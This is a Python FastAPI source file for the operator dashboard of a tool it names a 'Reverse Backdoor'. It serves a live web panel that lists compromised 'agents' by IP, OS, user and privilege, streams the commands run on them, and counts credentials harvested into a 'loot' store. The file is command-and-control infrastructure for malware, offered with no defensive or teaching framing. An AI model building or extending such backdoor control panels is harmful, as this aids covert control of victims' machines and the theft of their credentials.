import asyncio

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Query
from fastapi.responses import HTMLResponse

from server.core.agent_registry import AgentRegistry
from common.logging import get_logger

_loot_dir = "loot"

_TEMPLATE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Reverse Backdoor — Dashboard</title>
<style>
:root{--bg:#0d1117;--surface:#161b22;--border:#30363d;--text:#c9d1d9;--dim:#8b949e;--green:#3fb950;--red:#f85149;--blue:#58a6ff;--yellow:#d2991d}
*{margin:0;padding:0;box-sizing:border-box}
body{font:14px/1.5 'SF Mono','Cascadia Code','Fira Code',monospace;background:var(--bg);color:var(--text);min-height:100vh}
header{background:var(--surface);border-bottom:1px solid var(--border);padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
header h1{font-size:16px;font-weight:600;color:var(--green)}
#status-dot{width:9px;height:9px;border-radius:50%;background:var(--green);display:inline-block;margin-right:6px}
main{display:grid;grid-template-columns:1fr 320px;gap:16px;padding:16px;min-height:calc(100vh - 60px)}
.stats{display:flex;gap:12px;grid-column:1/-1}
.card{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:14px;flex:1}
.card .val{font-size:28px;font-weight:700;color:var(--blue)}
.card .lbl{font-size:12px;color:var(--dim);text-transform:uppercase;letter-spacing:.5px}
table{width:100%;border-collapse:collapse;background:var(--surface);border:1px solid var(--border);border-radius:6px;overflow:hidden}
th{padding:10px 14px;text-align:left;font-size:12px;font-weight:600;color:var(--dim);text-transform:uppercase;background:var(--bg);border-bottom:1px solid var(--border)}
td{padding:8px 14px;font-size:13px;border-bottom:1px solid var(--border)}
tr:hover td{background:rgba(88,166,255,0.04)}
.agent-id{color:var(--green)}
aside{background:var(--surface);border:1px solid var(--border);border-radius:6px;display:flex;flex-direction:column;max-height:calc(100vh - 100px)}
aside h2{font-size:13px;font-weight:600;text-transform:uppercase;color:var(--dim);padding:12px 14px;border-bottom:1px solid var(--border)}
#log-list{flex:1;overflow-y:auto;padding:8px 0}
.log-entry{padding:6px 14px;font-size:12px;border-bottom:1px solid rgba(48,54,61,0.5)}
.log-entry .ts{color:var(--dim);margin-right:8px}
.log-entry .cmd{color:var(--yellow)}
.log-entry .status-ok{color:var(--green)}
.log-entry .status-error{color:var(--red)}
a{color:var(--blue);text-decoration:none}
a:hover{text-decoration:underline}
</style>
</head>
<body>
<header><h1><span id="status-dot"></span>Reverse Backdoor</h1><span id="clock" style="color:var(--dim)"></span></header>
<main>
<div class="stats">
  <div class="card"><div class="val" id="stat-agents">0</div><div class="lbl">Agents Online</div></div>
  <div class="card"><div class="val" id="stat-cmds">0</div><div class="lbl">Commands Today</div></div>
  <div class="card"><div class="val" id="stat-creds">0</div><div class="lbl">Credentials Found</div></div>
</div>
<div>
  <table><thead><tr><th>ID</th><th>IP</th><th>OS</th><th>User</th><th>Priv</th><th>Last Seen</th></tr></thead>
  <tbody id="agent-tbody"></tbody></table>
</div>
<aside>
  <h2>Command Log</h2>
  <div id="log-list"></div>
</aside>
</main>
<script>
const ws=new WebSocket(`${location.protocol==='https:'?'wss':'ws'}://${location.host}/ws`);
let agentsCache={};
function ago(ts){const d=(Date.now()-ts*1000)/1000;if(d<60)return Math.floor(d)+'s ago';if(d<3600)return Math.floor(d/60)+'m ago';return Math.floor(d/3600)+'h ago'}
function render(){const tbody=document.getElementById('agent-tbody');tbody.innerHTML=Object.values(agentsCache).map(a=>`<tr><td><a href="/api/agents/${a.agent_id}" class="agent-id">${a.agent_id}</a></td><td>${a.ip}</td><td>${a.os||'?'}</td><td>${a.user||'?'}</td><td>${a.privilege||'?'}</td><td>${ago(a.connected_at)}</td></tr>`).join('');}
function addLog(entry){const d=document.getElementById('log-list');const cls=entry.status==='ok'?'status-ok':'status-error';const el=document.createElement('div');el.className='log-entry';el.innerHTML=`<span class="ts">${entry.ts}</span><span class="cmd">${entry.cmd}</span> <span class="${cls}">${entry.status}</span>`;d.prepend(el);if(d.children.length>100)d.lastChild.remove();}
ws.onmessage=function(e){const m=JSON.parse(e.data);if(m.type==='agents'){agentsCache={};for(const a of m.data)agentsCache[a.agent_id]=a;render();document.getElementById('stat-agents').textContent=m.data.length}
else if(m.type==='connected'){agentsCache[m.data.agent_id]=m.data;render();document.getElementById('stat-agents').textContent=Object.keys(agentsCache).length}
else if(m.type==='disconnected'){delete agentsCache[m.agent_id];render();document.getElementById('stat-agents').textContent=Object.keys(agentsCache).length}
else if(m.type==='command'){addLog(m.data);document.getElementById('stat-cmds').textContent=m.stats?.total_cmds||0;document.getElementById('stat-creds').textContent=m.stats?.total_creds||0}
else if(m.type==='init'){agentsCache={};for(const a of m.data.agents)agentsCache[a.agent_id]=a;render();document.getElementById('stat-agents').textContent=m.data.agents.length;document.getElementById('stat-cmds').textContent=m.data.stats.total_cmds;document.getElementById('stat-creds').textContent=m.data.stats.total_creds}};
ws.onclose=function(){document.getElementById('status-dot').style.background='var(--red)'};
setInterval(()=>{document.getElementById('clock').textContent=new Date().toISOString().slice(0,19).replace('T',' ')},1000);
</script>
</body>
</html>"""

app = FastAPI(title="Reverse Backdoor Dashboard", docs_url=None, redoc_url=None)
_clients: set = set()
_ws_lock = asyncio.Lock()


@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse(_TEMPLATE)


@app.get("/api/agents")
async def list_agents():
    registry = AgentRegistry()
    agents = {}
    for aid, info in registry.list_all().items():
        agents[aid] = {
            "agent_id": info.agent_id, "ip": info.ip,
            "hostname": info.hostname, "os": info.os, "user": info.user,
            "privilege": info.privilege, "connected_at": info.connected_at,
        }
    return list(agents.values())


@app.get("/api/agents/{agent_id}")
async def get_agent(agent_id: str):
    info = AgentRegistry().get(agent_id)
    if not info:
        return {"error": "agent not found"}
    return {
        "agent_id": info.agent_id, "ip": info.ip,
        "hostname": info.hostname, "os": info.os, "user": info.user,
        "privilege": info.privilege, "connected_at": info.connected_at,
    }


@app.get("/api/logs")
async def logs(agent_id: str = Query(None), n: int = Query(20)):
    entries = get_logger().get_recent_commands(agent_id, n)
    return [e.to_json_dict() for e in entries]


@app.get("/api/stats")
async def stats():
    registry = AgentRegistry()
    logger = get_logger()
    n_agents = len(registry.list_all())
    summary = logger.command_summary()
    total_cmds = sum(s['total'] for s in summary.values())
    try:
        from server.core.audit import CredentialStore
        cred_store = CredentialStore(_loot_dir)
        total_creds = cred_store.stats().get("total_credentials", 0)
    except Exception:
        total_creds = 0
    return {"agents_online": n_agents, "total_commands": total_cmds, "total_credentials": total_creds}


@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):
    await ws.accept()
    async with _ws_lock:
        _clients.add(ws)

    registry = AgentRegistry()
    logger = get_logger()
    try:
        agents_data = []
        for aid, info in registry.list_all().items():
            agents_data.append({
                "agent_id": info.agent_id, "ip": info.ip,
                "hostname": info.hostname, "os": info.os, "user": info.user,
                "privilege": info.privilege, "connected_at": info.connected_at,
            })
        summary = logger.command_summary()
        total_cmds = sum(s['total'] for s in summary.values())
        await ws.send_json({
            "type": "init", "data": {"agents": agents_data,
                                     "stats": {"total_cmds": total_cmds, "total_creds": 0}}
        })

        seen_ids = {a["agent_id"] for a in agents_data}
        last_cmd_count = total_cmds

        while True:
            await asyncio.sleep(2)
            current = {}
            for aid, info in registry.list_all().items():
                current[aid] = {
                    "agent_id": info.agent_id, "ip": info.ip,
                    "hostname": info.hostname, "os": info.os, "user": info.user,
                    "privilege": info.privilege, "connected_at": info.connected_at,
                }
            cur_ids = set(current.keys())
            for aid in cur_ids - seen_ids:
                await ws.send_json({"type": "connected", "data": current[aid]})
            for aid in seen_ids - cur_ids:
                await ws.send_json({"type": "disconnected", "agent_id": aid})
            seen_ids = cur_ids

            new_summary = logger.command_summary()
            new_cmds = sum(s['total'] for s in new_summary.values())
            if new_cmds > last_cmd_count:
                recent = logger.get_recent_commands(n=1)
                if recent:
                    await ws.send_json({"type": "command", "data": recent[0].to_json_dict(),
                                        "stats": {"total_cmds": new_cmds, "total_creds": 0}})
                last_cmd_count = new_cmds
    except WebSocketDisconnect:
        pass
    finally:
        async with _ws_lock:
            _clients.discard(ws)


def run_dashboard(host: str = "0.0.0.0", port: int = 8080, loot_dir: str = "loot"):
    global _loot_dir
    _loot_dir = loot_dir
    import uvicorn
    uvicorn.run(app, host=host, port=port, log_level="warning")
